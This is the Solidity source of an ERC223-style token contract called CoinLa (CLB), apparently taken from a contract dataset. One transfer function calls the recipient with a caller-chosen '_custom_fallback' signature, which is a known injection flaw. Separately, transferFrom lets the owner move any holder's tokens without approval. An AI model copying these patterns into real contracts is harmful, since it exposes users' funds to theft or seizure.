['pragma solidity ^0.4.9;\n', ' \n', '\n', 'contract SafeMath {\n', '    uint256 constant public MAX_UINT256 =\n', '    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;\n', '\n', '    function safeAdd(uint256 x, uint256 y) pure internal returns (uint256 z) {\n', '        if (x > MAX_UINT256 - y) assert(false);\n', '        return x + y;\n', '    }\n', '\n', '    function safeSub(uint256 x, uint256 y) pure internal returns (uint256 z) {\n', '        if (x < y) assert(false);\n', '        return x - y;\n', '    }\n', '\n', '    function safeMul(uint256 x, uint256 y) pure internal returns (uint256 z) {\n', '        if (y == 0) return 0;\n', '        if (x > MAX_UINT256 / y) assert(false);\n', '        return x * y;\n', '    }\n', '}\n', '\n', 'contract ContractReceiver {\n', '    function tokenFallback(address _from, uint _value, bytes _data) public;\n', '}\n', ' \n', 'contract CLB is SafeMath { \n', '    \n', '    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n', '    event Burn(address indexed burner, uint256 value);\n', '\n', '    mapping(address => uint) balances;\n', '  \n', '    string public name    = "CoinLa";\n', '    string public symbol  = "CLB";\n', '    uint8 public decimals = 8;\n', '    uint256 public totalSupply;\n', '    uint256 public burn;\n', '\taddress owner;\n', '  \n', '    constructor(uint256 _supply, string _name, string _symbol, uint8 _decimals) public\n', '    {\n', '        if (_supply == 0) _supply = 500000000000000000;\n', '\n', '        owner = msg.sender;\n', '        balances[owner] = _supply;\n', '        totalSupply = balances[owner];\n', '\n', '        name = _name;\n', '        decimals = _decimals;\n', '        symbol = _symbol;\n', '    }\n', '    \n', '\n', '  \n', '  \n', '  // Function to access name of token .\n', '  function name() public constant returns (string _name) {\n', '      return name;\n', '  }\n', '  // Function to access symbol of token .\n', '  function symbol() public constant returns (string _symbol) {\n', '      return symbol;\n', '  }\n', '  // Function to access decimals of token .\n', '  function decimals() public constant returns (uint8 _decimals) {\n', '      return decimals;\n', '  }\n', '  // Function to access total supply of tokens .\n', '  function totalSupply() public constant returns (uint256 _totalSupply) {\n', '      return totalSupply;\n', '  }\n', '  \n', '  \n', '  // Function that is called when a user or another contract wants to transfer funds .\n', '  function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {\n', '      \n', '    if(isContract(_to)) {\n', '        if (balanceOf(msg.sender) < _value) assert(false);\n', '        balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);\n', '        balances[_to] = safeAdd(balanceOf(_to), _value);\n', '        assert(_to.call.value(0)(bytes4(keccak256(abi.encodePacked(_custom_fallback))), msg.sender, _value, _data));\n', '        emit Transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '    else {\n', '        return transferToAddress(_to, _value, _data);\n', '    }\n', '}\n', '  \n', '\n', '  // Function that is called when a user or another contract wants to transfer funds .\n', '  function transfer(address _to, uint _value, bytes _data) public returns (bool success) {\n', '      \n', '    if(isContract(_to)) {\n', '        return transferToContract(_to, _value, _data);\n', '    }\n', '    else {\n', '        return transferToAddress(_to, _value, _data);\n', '    }\n', '}\n', '  \n', '    // Standard function transfer similar to ERC20 transfer with no _data .\n', '    // Added due to backwards compatibility reasons .\n', '    function transfer(address _to, uint _value) public returns (bool success) {\n', '\n', '        //standard function transfer similar to ERC20 transfer with no _data\n', '        //added due to backwards compatibility reasons\n', '        bytes memory empty;\n', '        if(isContract(_to)) {\n', '            return transferToContract(_to, _value, empty);\n', '        }\n', '        else {\n', '            return transferToAddress(_to, _value, empty);\n', '        }\n', '    }\n', '\n', '\t//assemble the given address bytecode. If bytecode exists then the _addr is a contract.\n', '    function isContract(address _addr) private view returns (bool is_contract) {\n', '        uint length;\n', '        assembly {\n', '        //retrieve the size of the code on target address, this needs assembly\n', '            length := extcodesize(_addr)\n', '        }\n', '        return (length>0);\n', '    }\n', '\n', '\t//function that is called when transaction target is an address\n', '    function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {\n', "        _data = '';\n", '        if (balanceOf(msg.sender) < _value) assert(false);\n', '        balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);\n', '        balances[_to] = safeAdd(balanceOf(_to), _value);\n', '        emit Transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '  \n', '  //function that is called when transaction target is a contract\n', '    function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {\n', '        if (balanceOf(msg.sender) < _value) assert(false);\n', '        balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);\n', '        balances[_to] = safeAdd(balanceOf(_to), _value);\n', '        ContractReceiver receiver = ContractReceiver(_to);\n', '        receiver.tokenFallback(msg.sender, _value, _data);\n', '        emit Transfer(msg.sender, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address _from, address _to, uint256 _value) public {\n', '        if(!isOwner()) return;\n', '\n', '        if (balances[_from] < _value) return;    \n', '        if (safeAdd(balances[_to] , _value) < balances[_to]) return;\n', '\n', '        balances[_from] = safeSub(balances[_from],_value);\n', '        balances[_to] = safeAdd(balances[_to],_value);\n', '        /* Notifiy anyone listening that this transfer took place */\n', '        \n', '        emit Transfer(_from, _to, _value);\n', '    }\n', '\n', '    function burn(uint256 _value) public {\n', '        if (balances[msg.sender] < _value) return;    \n', '        balances[msg.sender] = safeSub(balances[msg.sender],_value);\n', '        burn = safeAdd(burn,_value);\n', '        emit Burn(msg.sender, _value);\n', '    }\n', '\n', '\tfunction isOwner() public view  \n', '    returns (bool)  {\n', '        return owner == msg.sender;\n', '    }\n', '\t\n', '    function balanceOf(address _owner) public constant returns (uint balance) {\n', '        return balances[_owner];\n', '    }\n', '}']